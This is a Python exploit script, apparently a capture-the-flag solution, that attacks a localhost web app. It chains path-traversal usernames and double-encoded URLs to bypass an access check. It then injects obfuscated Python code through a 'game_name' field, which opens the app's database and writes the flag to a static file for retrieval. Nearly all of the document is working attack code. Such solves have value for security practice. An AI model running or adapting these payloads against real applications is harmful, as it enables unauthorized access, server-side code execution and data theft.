import requests as r
import random
import base64
import json

def gen_pass():
    return ''.join(map(chr,(random.randrange(65,90) for x in range(0,20))))
                   
URL = "http://localhost"

random_user = gen_pass()
random_pass = gen_pass()

r1 = r.post(f"{URL}/register",data={
    'username':random_user,
    'password':random_pass
})

r1 = r.post(f"{URL}/login",data={
    'username':random_user,
    'password':random_pass
})

cookie = r1.history[0].cookies['session']
uid = json.loads(base64.b64decode(cookie.split('.')[0] + '=='))['uid']

r1 = r.post(f"{URL}/register",data={
    'username':f'../../admit/{uid}',
    'password':random_pass
})

r1 = r.post(f"{URL}/login",data={
    'username':f'../../admit/{uid}',
    'password':random_pass
})

r1 = r.get(f"{URL}/request_access/..%252f..%252fadmit%252f{uid}")

print(f"{random_user}:{random_pass}")

# Part 2
game_name = """a:\n\t1
b=getattr
c=chr(47)
x=b(b(b(b(b(chr,'__self__'),'__import__')('db'),'DatabaseHelper')(),'conn'),'cursor')()
b(x,'execute')("SELECT * FROM games")
out=b(b(x,'fetchone')(),'__getitem__')(0)
b(open(f'{c}app{c}static{c}a','w'),'write')(out)
class b"""

r1 = r.post(f"{URL}/login",data={
    'username':random_user,
    'password':random_pass
})

cookie = r1.history[0].cookies['session']

r1 = r.post(f'{URL}/create_game',data={
    'game_name':game_name,
    'game_desc':"123"
	},headers={
		'Cookie':f'session={cookie}'
})

def url_encode_all(string):
    return "".join("%{0:0>2x}".format(ord(char)) for char in string)

print(url_encode_all(game_name))

r1 = r.get(f'{URL}/game/{random_user}/{url_encode_all(game_name)}/test',headers={
		'Cookie':f'session={cookie}'
})

print(f"FLAG: {r.get(f'{URL}/static/a').text}")



